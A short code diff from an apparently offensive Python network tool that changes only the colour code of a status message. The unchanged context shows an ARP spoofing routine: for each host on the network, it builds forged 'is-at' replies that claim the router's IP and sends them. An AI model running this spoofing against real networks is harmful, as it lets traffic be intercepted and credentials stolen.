@@ -93,7 +93,7 @@ def arp_spoof2(): # Get all MAC addresses of the network + spoof them
       arp = ARP(pdst=x['ip'], psrc=routeur_ip, op="is-at")
       packet = ethernet / arp
       sendp(packet, iface=iface)
-      print("\033[1;11m [*]Spoof sent to ( {0} )".format(x['ip']))
+      print("\033[1;31m [*]Spoof sent to ( {0} )".format(x['ip']))
 
 
 def arp_sniffing2(pkt):
